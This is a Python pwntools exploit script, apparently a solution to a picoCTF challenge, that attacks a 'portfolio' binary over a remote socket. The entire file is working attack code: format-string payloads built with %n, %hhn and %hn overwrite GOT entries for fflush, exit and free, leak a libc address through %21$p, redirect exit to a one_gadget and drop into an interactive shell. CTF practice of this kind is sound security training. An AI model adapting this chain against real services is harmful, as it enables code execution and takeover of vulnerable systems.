#!/usr/bin/python3

from pwn import *
import sys

BIN = './V'
LIB = "./libc.so.6"

# https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.symbols

e = ELF(BIN)
l = ELF(LIB)

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 57985)
else:
    r = process(BIN, env={"LD_PRELOAD": LIB})

written = 0
def next_byte(n, bits):
    global written
    written_masked = written & ((1 << bits) - 1)

    if written_masked < n:
        written += n - written_masked
        return n - written_masked
    else:
        written += ((1 << bits) - written_masked) + n
        return ((1 << bits) - written_masked) + n

r.sendlineafter('2) View my portfolio\n', '1')
# First:  0x7ffc12014950 -> 0x7ffc12014990 -> 0x400ca0
#         0x7ffc12014950 -> 0x7ffc12014990 -> 0x602058
# Second: 0x7ffc12014990 -> 0x602058 -> XXXXX
#         0x7ffc12014990 -> 0x602058 -> main


### The gadget chain ###
# 1. fflush -> start ===> code reuse
# 2. exit -> one_gadget ===> shell gadget
# 3. free -> call_exit in main ===> trampoline, make sure rsp & 0xf == 0
######

### break point 0x400ac9
##### normal fflush -> start #####
fsb_rsp_offset = 6 - 1 # next is fsb
# 0x5 == rsi, rdx, rcx, r8, r9 (?)
payload = ""
payload += "%c" * (0x5 + fsb_rsp_offset)
written += (0x5 + fsb_rsp_offset)
# 0x602058 == 6299736
payload += f"%{next_byte(e.got['fflush'], 32)}c"
payload += f"%n"

payload += "%c" * 6 
written += 6
# 0x400780 == start
payload += f"%{next_byte(0x80, 8)}c"
payload += f"%hhn"
payload += "-%21$p"

r.sendlineafter('What is your API token?\n', payload)
print(payload)
r.recvuntil('0x', drop=True)
libc = int(r.recv(12), 16) - 0x21b10 - 0xe7
ogs = [
    libc + 0x4f3d5, # remote
]
# 0x4f3d5 remote one gadget 
info(f"""
libc = {hex(libc)}
""")

##### exit -> one_gadget #####
for i in range(0, 6):
    print(i)
    r.sendlineafter('2) View my portfolio\n', '1')
    fsb_rsp_offset = 5
    payload = ""
    written = 0

    payload += "%c" * (0x5 + fsb_rsp_offset)
    written += (0x5 + fsb_rsp_offset)
    payload += f"%{next_byte(e.got['exit']+i, 32)}c"
    payload += f"%n"
                          
    payload += "%c" * 6
    written += 6
    # 0x400780 == start
    b = (ogs[0] >> 8*i) & 0xff
    payload += f"%{next_byte(b, 8)}c"
    payload += f"%hhn" 
    payload += "-%21$p" 
    r.sendlineafter('What is your API token?\n', payload)



##### free -> exit #####
call_exit = 0x400c99
for i in range(2):
    r.sendlineafter('2) View my portfolio\n', '1')
    fsb_rsp_offset = 5
    payload = ""
    written = 0

    payload += "%c" * (0x5 + fsb_rsp_offset)
    written += (0x5 + fsb_rsp_offset)
    payload += f"%{next_byte(e.got['free']+i*2, 32)}c"
    payload += f"%n"
                  
    payload += "%c" * 6
    written += 6
    b = (call_exit >> 16*i) & 0xffff
    payload += f"%{next_byte(b, 16)}c"
    payload += f"%hn" 
    payload += "-%21$p" 
    r.sendlineafter('What is your API token?\n', payload)


##### fflush -> normal fflush #####
r.sendlineafter('2) View my portfolio\n', '1')
fsb_rsp_offset = 5
payload = ""
written = 0

payload += "%c" * (0x5 + fsb_rsp_offset)
written += (0x5 + fsb_rsp_offset)
payload += f"%{next_byte(e.got['fflush'], 32)}c"
payload += f"%n"
                      
payload += "%c" * 6
written += 6
# 0x400780 == start
payload += f"%{next_byte(0x46, 8)}c"
payload += f"%hhn" 
payload += "-%21$p"

input()
r.sendlineafter('What is your API token?\n', payload)

r.interactive()
